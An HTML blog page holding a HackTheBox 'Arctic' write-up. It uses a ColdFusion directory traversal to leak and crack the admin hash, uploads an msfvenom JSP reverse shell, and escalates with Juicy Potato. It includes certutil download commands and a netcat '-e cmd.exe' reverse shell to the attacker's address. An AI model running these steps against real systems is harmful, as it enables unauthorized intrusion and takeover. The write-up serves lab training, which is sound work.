@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Arctic | This is another HTB write-up where we will exploit an Adobe Coldfusion vulnerability to get initial foothold in the box. Once in the Windows...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Arctic</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-10-02 16:03:00+01:00">Fri 02 October 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Arctic.html">Arctic</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Arctic.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>This is another HTB write-up where we will exploit an Adobe Coldfusion vulnerability to get initial foothold in the box. Once in the Windows 2008 box, the <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> exploit was used in order to get an administrative shell.</p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~/Documents/HTB/boxes/results/10.10.10.11/scans$</span> cat _full_tcp_nmap.txt 
+<span class="gp">#</span> Nmap <span class="m">7</span>.80 scan initiated Mon Sep <span class="m">28</span> <span class="m">14</span>:28:40 <span class="m">2020</span> as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/kali/Documents/HTB/boxes/results/10.10.10.11/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/HTB/boxes/results/10.10.10.11/scans/xml/_full_tcp_nmap.xml <span class="m">10</span>.10.10.11
+<span class="go">Nmap scan report for 10.10.10.11</span>
+<span class="go">Host is up, received user-set (0.094s latency).</span>
+<span class="go">Scanned at 2020-09-28 14:28:40 BST for 723s</span>
+<span class="go">Not shown: 65532 filtered ports</span>
+<span class="go">Reason: 65532 no-responses</span>
+<span class="go">PORT      STATE SERVICE REASON  VERSION</span>
+<span class="go">135/tcp   open  msrpc   syn-ack Microsoft Windows RPC</span>
+<span class="go">8500/tcp  open  fmtp?   syn-ack</span>
+<span class="go">49154/tcp open  msrpc   syn-ack Microsoft Windows RPC</span>
+<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Read data files from: /usr/bin/../share/nmap</span>
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="gp">#</span> Nmap <span class="k">done</span> at Mon Sep <span class="m">28</span> <span class="m">14</span>:40:43 <span class="m">2020</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">723</span>.23 seconds
+</pre></div>
+
+
+<p>the nmap output above shows we have 3 ports open. 135 and 49154 seems to be MSRPC ports.</p>
+<p>Nmap is unable to identify with certainty what port 8500 is so I do a quick search online and I find this <a href="https://www.speedguide.net/port.php?port=8500">link</a> which shows the following potential services:</p>
+<p><img alt="" src="../images/artic-ports.png"></p>
+<p>Two of the entries refers to <a href="https://en.wikipedia.org/wiki/Adobe_ColdFusion">Adobe ColdFusion</a>, that is a web development platform.</p>
+<p>So I checked the URL <code>http://10.10.10.11:8500</code> where I found the <code>CFIDE</code> directory, under which I found the <code>administrator</code> directory. Navigating to that page shows the Adobe ColdFusion administration panel</p>
+<p><img alt="" src="../images/artic-coldfusion.png"></p>
+<p>On doing some research I found a Directory Traversal vulnerability on <a href="https://www.exploit-db.com/exploits/14641">exploitdb</a></p>
+<p>I don't run the exploit script, instead, I navigate to the URL suggested in the exploit:</p>
+<p><code>http://10.10.10.11/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</code></p>
+<p>and I get this page:</p>
+<p><img alt="" src="../images/artic-coldfusion-hash.png"></p>
+<p>Seems like a password hash was found, <code>2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03</code>. </p>
+<p>Before trying to crack the hash with tools like <code>hashcat</code> or <code>john</code>, I always give it a try with crackstation as it's usually faster:</p>
+<p><img alt="" src="../images/artic-crackstation.png"></p>
+<p>The password was available on crackstation database, and it is <code>happyday</code>.</p>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<p>Once logged in I start exploring the GUI and I am particularly interested on a functionality that would allow me to upload some code. In the end I found the "Debugging &amp; Logging &gt; Add/Edit Scheduled Task" section:</p>
+<p><img alt="" src="../images/arctic-scheduledTask.png"></p>
+<p>This section enables admins of the console to generate scheduled tasks and call remote scripts. After some research I found that ColdFusion can run <code>JSP</code> code so I generate a <code>JSP</code> shell and I host it on a python http server:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~/Documents/HTB/boxes/results/10.10.10.11/exploit$</span> msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.9 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f raw -o shell.jsp
+<span class="go">Payload size: 1495 bytes</span>
+<span class="go">Saved as: shell.jsp</span>
+<span class="gp">kali@kali:~/Documents/oscp/results/10.11.1.10/exploit$</span> sudo python -m http.server <span class="m">80</span>
+<span class="go">[sudo] password for kali: </span>
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</pre></div>
+
+
+<p><img alt="" src="../images/arctic-JSP.png"></p>
+<p>Now, in the URL field I enter the URL which points to the python http server running on my Kali box:</p>
+<p><code>http://10.10.14.9/shell.jsp</code></p>
+<p>and in the File field I enter the ColdFusion default web root directory:</p>
+<p><code>C:\ColdFusion8\wwwroot\CFIDE\shell.sjp</code></p>
+<p>then I click on submit.</p>
+<p>Now I run the Scheduled task on-demand:</p>
+<p><img alt="" src="../images/arctic-run-task.png"></p>
+<p>I can see that the shell has been called, sign that the process is working:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~/Documents/HTB/boxes/results/10.10.10.11/exploit$</span> sudo python -m http.server <span class="m">80</span>
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+<span class="go">10.10.10.11 - - [02/Oct/2020 16:58:11] &quot;GET /shell.jsp HTTP/1.1&quot; 200 -</span>
+</pre></div>
+
+
+<p>Now I will activate a netcat listener on port 443 and I navigate to the newly added shell by navigating to _http://10.10.10.11:8500/CFIDE/shell.jsp:</p>
+<p>I get my shell back and I can grab the <code>user.txt</code> file:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~$</span> sudo rlwrap nc -lnvp <span class="m">443</span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49474</span>
+<span class="go">Microsoft Windows [Version 6.1.7600]</span>
+<span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+
+<span class="go">C:\ColdFusion8\runtime\bin&gt;whoami</span>
+<span class="go">whoami</span>
+<span class="go">arctic\tolis</span>
+<span class="go">C:\ColdFusion8\runtime\bin&gt;type c:\users\tolis\desktop\user.txt</span>
+<span class="go">type c:\users\tolis\desktop\user.txt</span>
+<span class="go">02****************************f3</span>
+</pre></div>
+
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>The first thing I do before running any enumeration scripts, I check if the <code>SeImpersonatePrivilege</code> is enable because if it is then I know for sure I can run <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> and get an administrative shell.</p>
+<div class="highlight"><pre><span></span><span class="go">C:\&gt;whoami /priv</span>
+<span class="go">whoami /priv</span>
+
+<span class="go">PRIVILEGES INFORMATION</span>
+<span class="go">----------------------</span>
+
+<span class="go">Privilege Name                Description                               State   </span>
+<span class="go">============================= ========================================= ========</span>
+<span class="go">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span>
+<span class="go">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span>
+<span class="go">SeCreateGlobalPrivilege       Create global objects                     Enabled </span>
+<span class="go">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span>
+</pre></div>
+
+
+<p><code>SeImpersonatePrivilege</code> is enable, so let's use Juicy Potato.</p>
+<p>I also run <code>systeminfo</code> to know a bit more about the machine in question:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\&gt;systeminfo</span>
+<span class="go">systeminfo</span>
+
+<span class="go">Host Name:                 ARCTIC</span>
+<span class="go">OS Name:                   Microsoft Windows Server 2008 R2 Standard </span>
+<span class="go">OS Version:                6.1.7600 N/A Build 7600</span>
+<span class="go">OS Manufacturer:           Microsoft Corporation</span>
+<span class="go">OS Configuration:          Standalone Server</span>
+<span class="go">OS Build Type:             Multiprocessor Free</span>
+<span class="go">Registered Owner:          Windows User</span>
+<span class="go">Registered Organization:   </span>
+<span class="go">Product ID:                55041-507-9857321-84451</span>
+<span class="go">Original Install Date:     22/3/2017, 11:09:45 </span>
+<span class="go">System Boot Time:          4/10/2020, 1:56:48 </span>
+<span class="go">System Manufacturer:       VMware, Inc.</span>
+<span class="go">System Model:              VMware Virtual Platform</span>
+<span class="go">System Type:               x64-based PC</span>
+<span class="go">Processor(s):              2 Processor(s) Installed.</span>
+<span class="go">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="go">                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="go">BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018</span>
+<span class="go">Windows Directory:         C:\Windows</span>
+<span class="go">System Directory:          C:\Windows\system32</span>
+<span class="go">Boot Device:               \Device\HarddiskVolume1</span>
+<span class="go">System Locale:             el;Greek</span>
+<span class="go">Input Locale:              en-us;English (United States)</span>
+<span class="go">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span>
+<span class="go">Total Physical Memory:     1.023 MB</span>
+<span class="go">Available Physical Memory: 240 MB</span>
+<span class="go">Virtual Memory: Max Size:  2.047 MB</span>
+<span class="go">Virtual Memory: Available: 1.190 MB</span>
+<span class="go">Virtual Memory: In Use:    857 MB</span>
+<span class="go">Page File Location(s):     C:\pagefile.sys</span>
+<span class="go">Domain:                    HTB</span>
+<span class="go">Logon Server:              N/A</span>
+<span class="go">Hotfix(s):                 N/A</span>
+<span class="go">Network Card(s):           1 NIC(s) Installed.</span>
+<span class="go">                           [01]: Intel(R) PRO/1000 MT Network Connection</span>
+<span class="go">                                 Connection Name: Local Area Connection</span>
+<span class="go">                                 DHCP Enabled:    No</span>
+<span class="go">                                 IP address(es)</span>
+<span class="go">                                 [01]: 10.10.10.11</span>
+</pre></div>
+
+
+<p>After downloaded the Juicy Potato project, I compiled it with Visual Studio on a Windows 10 box and I obtained an executable:</p>
+<p><img alt="" src="../images/arctic-juicy.png"></p>
+<p>Then I transfer the exe to my Kali box and I host it on a python http server so that I can download it on the victim machine using <code>certutil</code>. I also download netcat with the same procedure:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\tolis\Desktop&gt;certutil -urlcache -split -f http://10.10.14.9/JuicyPotato.exe jp.exe</span>
+<span class="go">certutil -urlcache -split -f http://10.10.14.9/JuicyPotato.exe jp.exe</span>
+<span class="go">****  Online  ****</span>
+<span class="go">  000000  ...</span>
+<span class="go">  053000</span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+
+<span class="go">C:\Users\tolis\Desktop&gt;certutil -urlcache -split -f http://10.10.14.9/nc64.exe nc.exe</span>
+<span class="go">certutil -urlcache -split -f http://10.10.14.9/nc64.exe nc.exe</span>
+<span class="go">****  Online  ****</span>
+<span class="go">  0000  ...</span>
+<span class="go">  b0d8</span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+
+<span class="go">C:\Users\tolis\Desktop&gt;dir</span>
+<span class="go">dir</span>
+<span class="go"> Volume in drive C has no label.</span>
+<span class="go"> Volume Serial Number is F88F-4EA5</span>
+
+<span class="go"> Directory of C:\Users\tolis\Desktop</span>
+
+<span class="go">04/10/2020  03:30     &lt;DIR&gt;          .</span>
+<span class="go">04/10/2020  03:30     &lt;DIR&gt;          ..</span>
+<span class="go">04/10/2020  03:29            339.968 jp.exe</span>
+<span class="go">04/10/2020  03:30             45.272 nc.exe</span>
+<span class="go">22/03/2017  10:01                 32 user.txt</span>
+<span class="go">               3 File(s)        385.272 bytes</span>
+<span class="go">               2 Dir(s)  33.182.298.112 bytes free</span>
+</pre></div>
+
+
+<p>Once I have the two exe files on the victim box I can execute the exploit:</p>
+<div class="highlight"><pre><span></span><span class="go">c:\Users\tolis\Desktop&gt; ./jp.exe -l 1234 -t * -p nc.exe -a &quot;-e cmd.exe 10.10.14.9 4444&quot; -c &quot;{03ca98d6-ff5d-49b8-abc6-03dd84127020}&quot;</span>
+<span class="go"> ./jp.exe -l 1234 -t * -p nc.exe -a &quot;-e cmd.exe 10.10.14.9 4444&quot; -c &quot;{03ca98d6-ff5d-49b8-abc6-03dd84127020}&quot;</span>
+
+<span class="go">c:\Users\tolis\Desktop&gt;jp.exe -l 1234 -t * -p nc.exe -a &quot;-e cmd.exe 10.10.14.9 4444&quot; -c &quot;{03ca98d6-ff5d-49b8-abc6-03dd84127020}&quot;</span>
+<span class="go">jp.exe -l 1234 -t * -p nc.exe -a &quot;-e cmd.exe 10.10.14.9 4444&quot; -c &quot;{03ca98d6-ff5d-49b8-abc6-03dd84127020}&quot;</span>
+<span class="go">Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 1234</span>
+<span class="go">....</span>
+<span class="go">[+] authresult 0</span>
+<span class="go">{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM</span>
+
+<span class="go">[+] CreateProcessWithTokenW OK</span>
+</pre></div>
+
+
+<p>where "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" was picked from <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise">here</a></p>
+<p>as expected I receive an administrative reverse shell and I am able to get the root flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~$</span> sudo rlwrap nc -lnvp <span class="m">4444</span>
+<span class="go">listening on [any] 4444 ...</span>
+<span class="go">connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49586</span>
+<span class="go">Microsoft Windows [Version 6.1.7600]</span>
+<span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;whoami</span>
+<span class="go">whoami</span>
+<span class="go">nt authority\system</span>
+
+<span class="go">C:\Windows\system32&gt;type c:\users\administrator\desktop\root.txt</span>
+<span class="go">type c:\users\administrator\desktop\root.txt</span>
+<span class="go">ce****************************90</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Arctic.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Arctic"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
